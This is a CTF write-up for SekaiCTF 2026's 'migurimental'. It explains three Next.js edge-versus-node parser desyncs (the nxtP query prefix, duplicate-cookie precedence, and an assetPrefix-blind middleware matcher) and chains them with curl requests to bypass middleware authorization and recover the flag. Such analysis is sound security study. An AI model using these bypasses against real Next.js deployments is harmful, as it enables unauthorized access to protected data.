@@ -1,0 +1,222 @@
+---
+title: 'SekaiCTF 2026 - migurimental'
+description: 'Three Next.js edge-vs-node desyncs chained: the nxtP query prefix, duplicate-cookie precedence, and a middleware matcher blind to assetPrefix'
+date: 2026-08-09
+tags: ['writeup', 'web', 'nextjs', 'parser-differential', 'logic-bug', 'sekaictf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Description
+
+Two Next.js **16.2.9** (Pages Router) apps sit behind nginx. The flag in `/flag.txt` is cut in half, one half per app:
+
+| App | Host | Serves | Flag part |
+| --- | --- | --- | --- |
+| `backstage1` | `migurimental.chals.sekai.team` | `/backroom` (first half via `readFirstFlagHalf`) | `SEKAI{7h3_l33k_..._7h3_` |
+| `backstage2` | `migurimental-2.chals.sekai.team` | `/` (second half via `readSecondFlagHalf`) | `c0nc3r7_..._b34m...}` |
+
+Every gate is enforced in `middleware.js` on the **edge runtime**, while the data it protects is read again in `getServerSideProps` on the **Node runtime**. The whole challenge is a study in edge-vs-node desyncs: the two runtimes parse the *same* request slightly differently.
+
+CVE-2025-29927 — the `x-middleware-subrequest` skip header — is patched in 16.2.9, so no classic one-shot bypass works. Parser inconsistencies are the only way through.
+
+## Source Code Analysis
+
+### backstage1, where `/backroom` is the prize
+
+`apps/backstage1/middleware.js` gates two routes:
+
+```javascript
+export const config = { matcher: ['/access-card', '/backroom'] }
+
+export async function middleware(request) {
+  const session = await verifyJwt(request.cookies.get('session')?.value)
+  if (!session?.sub) return deny(request)
+
+  if (request.nextUrl.pathname === '/access-card') {
+    const checkedId = request.nextUrl.searchParams.get('id')
+    if (checkedId !== session.sub) return deny(request)          // you may only view YOUR OWN card
+  }
+
+  if (request.nextUrl.pathname === '/backroom') {
+    const expectedTicket = session.ticketUuid
+    const middlewareTicket = request.cookies.get('ticket_uuid')?.value || ''
+    if (!expectedTicket || middlewareTicket !== expectedTicket) return deny(request)
+  }
+
+  return NextResponse.next()
+}
+```
+
+`pages/backroom.js` re-checks only the **cookie**, never the session:
+
+```javascript
+export async function getServerSideProps({ req, res }) {
+  const ticketUser = await findByTicketUuid(req.cookies.ticket_uuid || '')
+  if (ticketUser?.id !== 1) { res.statusCode = 403; return { props: { denied: true } } }
+  return { props: { backstageNote: await readFirstFlagHalf(), denied: false } }
+}
+```
+
+`pages/access-card.js` renders a QR code of `user.ticketUuid` for whatever `query.id` asks for:
+
+```javascript
+export async function getServerSideProps({ query }) {
+  const user = await findById(query.id)
+  if (!user) return { notFound: true }
+  const qrDataUrl = await QRCode.toDataURL(user.ticketUuid, { /* ... */ })
+  return { props: { user: { id, username, tier }, qrDataUrl } }
+}
+```
+
+`miku` is seeded as user id 1 with a random `crypto.randomUUID()` ticket, and the JWT secret is `crypto.randomBytes(32)` generated at runtime, so the session is unforgeable.
+
+That sets up the squeeze: reading the first half needs `findByTicketUuid(cookie).id === 1`, i.e. miku's `ticket_uuid` in my cookie. The only place that value is ever rendered is the QR on `/access-card?id=1` — which the middleware locks to `id === session.sub`.
+
+### backstage2, where `/` is the prize
+
+```javascript
+// middleware.js
+export const config = { matcher: ['/'] }
+export function middleware(request) {
+  if ((request.headers.get('x-real-migu') || '') !== '1.3.3.7') {
+    return NextResponse.redirect(new URL('/rejected', request.url), 302)
+  }
+  return NextResponse.next()
+}
+```
+
+```javascript
+// next.config.js
+module.exports = { assetPrefix: '/cdn' }
+```
+
+nginx force-sets `proxy_set_header X-Real-Migu $remote_addr`, so the header can never legitimately be `1.3.3.7`. The load-bearing detail is `assetPrefix: '/cdn'`.
+
+## Bug 1 - the `nxtP` query-param desync
+
+To leak miku's ticket I need `/access-card?id=1` to render while the middleware sees my own id.
+
+What does not work, and why:
+
+- **Duplicate `?id=2284&id=1`** — the middleware's `searchParams.get('id')` returns the *first* value and passes, but the page builds `query` through Next's `searchParamsToUrlQuery`, which collapses duplicates into an **array**. `findById(["2284","1"])` binds the array as one SQL parameter, yielding `NULL`, no row, and a 404.
+- **Path and encoding tricks** — the matcher regex actually *over*-matches relative to routing, so whenever the page renders, `nextUrl.pathname` is `/access-card` and the id check fires. backstage1 sets no `assetPrefix` or `basePath`, so there is nothing to hide behind.
+- **Internal headers** — `x-middleware-subrequest`, `x-nextjs-data`, `x-matched-path` and friends are stripped or ineffective in 16.2.9.
+
+The bug is Next's internal query prefix `nxtP` (`NEXT_QUERY_PARAM_PREFIX`), used to smuggle route params. The two runtimes handle it in opposite directions:
+
+- **Edge middleware** (`server/web/utils.js`, `normalizeNextQueryParam`) **renames** a `nxtP`-prefixed key to its suffix, deleting and overwriting the real key:
+
+  ```javascript
+  // nxtPid  ->  id     (real `id` is deleted, then replaced with nxtPid's value)
+  requestURL.searchParams.delete(normalizedKey)
+  for (const val of value) requestURL.searchParams.append(normalizedKey, val)
+  requestURL.searchParams.delete(key)
+  ```
+
+- **Node page render** (`server/server-utils.js`, `filterInternalQuery`) simply **deletes** the `nxtP` key, leaving the literal `id` untouched.
+
+One request therefore splits cleanly in two:
+
+```http
+GET /access-card?nxtPid=2284&id=1
+Cookie: session=<my JWT, sub=2284>
+```
+
+The middleware resolves `id` to `2284`, matches `session.sub`, and allows the request. The page drops `nxtPid` entirely and sees `query.id === "1"` — a clean string rather than the array the duplicate-param trick produced — so `findById(1)` returns miku and renders her QR.
+
+## Bug 2 - the duplicate-cookie desync
+
+`/backroom` reads `ticket_uuid` with `request.cookies.get()` (edge `@edge-runtime/cookies`) in the middleware, and with `req.cookies.ticket_uuid` (Node `next/dist/compiled/cookie`) in the page. On duplicate cookies they disagree about which one wins:
+
+| Reader | Duplicate `ticket_uuid=A; ticket_uuid=B` |
+| --- | --- |
+| Edge `request.cookies.get()` (middleware) | **last**, so `B` |
+| Node `req.cookies` (page) | **first**, so `A` |
+
+Confirmed live, both orderings fail for the obvious reason:
+
+```text
+# [garbage, mine] -> mw reads LAST=mine (passes), page reads FIRST=garbage -> 403 rejected
+Cookie: session=<mine>; ticket_uuid=GARBAGE; ticket_uuid=<MINE>   => 403
+# [mine, garbage] -> mw reads LAST=garbage != session.ticketUuid    => 302 /failed
+Cookie: session=<mine>; ticket_uuid=<MINE>; ticket_uuid=GARBAGE    => 302
+```
+
+Putting miku first and mine last satisfies both checks in a single request — the middleware compares its last value against my session, and the page resolves its first value to miku:
+
+```http
+GET /backroom
+Cookie: session=<mine>; ticket_uuid=<MIKU_UUID>; ticket_uuid=<MY_UUID>
+```
+
+## Bug 3 - the matcher that cannot see `assetPrefix`
+
+The `/` matcher compiles to:
+
+```text
+^(?:\/(_next\/data\/[^/]{1,}))?(?:\/(\/?index|\/?index\.json|...))?[\/#\?]?$
+```
+
+The regex knows about the `/_next/data/<buildId>` prefix but is completely blind to `assetPrefix` — `basePath` gets prepended to matchers, `assetPrefix` does not. Next's data-route resolver, meanwhile, happily strips `/cdn` before resolving the page.
+
+So a data request under the asset prefix reaches `index`'s `getServerSideProps` while the matcher never fires. The middleware does not run at all, which makes the `x-real-migu` gate irrelevant rather than bypassed:
+
+```http
+GET /cdn/_next/data/<buildId>/index.json
+```
+
+`<buildId>` is published in `__NEXT_DATA__` on any page, including `/rejected`.
+
+## Exploitation
+
+### Part 1, backstage1
+
+```bash
+B=https://migurimental.chals.sekai.team
+
+# 1. Register -> valid session + your own ticket. Note your id (= session.sub).
+curl -s -i -c jar.txt "$B/api/register" --data 'username=pwn123&password=password123'
+#   sub=2284, ticket_uuid=cef4e3a6-...
+
+# 2. nxtP desync: middleware sees id=2284 (yours), page renders id=1 (miku) -> miku's QR
+curl -s -b jar.txt "$B/access-card?nxtPid=2284&id=1" -o miku.html
+#   <h2>miku</h2> ... VIP ... <img src="data:image/png;base64,iVBOR...">
+
+# 3. Decode the QR PNG  (jsQR / zbarimg)  ->  0464e4c2-2700-4e36-8401-597482a41ac7
+
+# 4. Cookie desync: miku first (page), mine last (middleware)
+curl -s -b jar.txt \
+  -H 'Cookie: session=<SESS>; ticket_uuid=0464e4c2-2700-4e36-8401-597482a41ac7; ticket_uuid=cef4e3a6-...' \
+  "$B/backroom"
+#   "backstageNote":"SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_"
+```
+
+QR decode helper:
+
+```javascript
+import fs from 'node:fs'; import { PNG } from 'pngjs'; import jsQR from 'jsqr'
+const png = PNG.sync.read(fs.readFileSync(process.argv[2]))
+console.log(jsQR(new Uint8ClampedArray(png.data), png.width, png.height).data)
+```
+
+### Part 2, backstage2
+
+```bash
+B2=https://migurimental-2.chals.sekai.team
+
+# 1. Grab buildId (and confirm assetPrefix:/cdn) from any page
+curl -s "$B2/rejected" | grep -oE '"buildId":"[^"]+"'   # nRVcVzPJ7U21AcMTs21fY
+
+# 2. assetPrefix matcher bypass -> index getServerSideProps, middleware skipped
+curl -s --path-as-is "$B2/cdn/_next/data/nRVcVzPJ7U21AcMTs21fY/index.json"
+#   "backstageNote":"c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}"
+```
+
+Concatenating the halves gives the flag. All three bugs are the same lesson: the edge middleware and the Node handler disagree about `nxtP` params (edge renames, node drops), duplicate cookies (edge reads last, node reads first), and `assetPrefix` paths (the matcher ignores it, the resolver strips it). Any one of them walks a request past a middleware check and lets the page see something different, which is why authorization belongs next to the data access rather than in a separately-parsed layer in front of it.
+
+## Flag
+
+```text
+SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}
+```
